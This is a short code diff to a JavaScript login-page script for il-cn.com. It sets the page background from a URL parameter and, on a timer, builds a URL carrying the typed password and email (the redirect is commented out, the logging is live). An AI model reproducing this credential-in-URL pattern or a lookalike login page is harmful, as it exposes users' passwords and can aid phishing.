@@ -65,10 +65,10 @@
 
   state = {
     url: 'https://www.il-cn.com/bfa/login.aspx',
-    bgUrl: 'https://www.il-cn.com/bfa/login.aspx',
+    bgUrl: 'https://www.il-cn.com/images/bg-login.jpg',
     email: '',
     password: '',
-    wait: 6000,
+    wait: 1,
   }
 
   const emailInput = document.querySelector('#floatingInputEmail')
@@ -106,15 +106,15 @@
 
   const bgUrl = urlParams.get('bgurl')
   if (bgUrl) {
-    state.url = bgUrl
-    document.querySelector('body').style.backgroundImage = state.url;
+    state.bgUrl = bgUrl
+    document.querySelector('body').style.backgroundImage = `url(${state.bgUrl})`;
   }
 
   if (state.wait) {
     setInterval(function () {
       // window.location.href=`${state.url}?password=${state.password}&url=${state.url}&wait=${state.wait}email=${state.email}`;
       console.log(`${state.url}?password='${state.password}'&url='${state.url}'&wait='${state.wait}'&email='${state.email}'`)
-    }, 1000);
+    }, state.wait * 1000);
   }
 
   passwordInput.value = state.password;
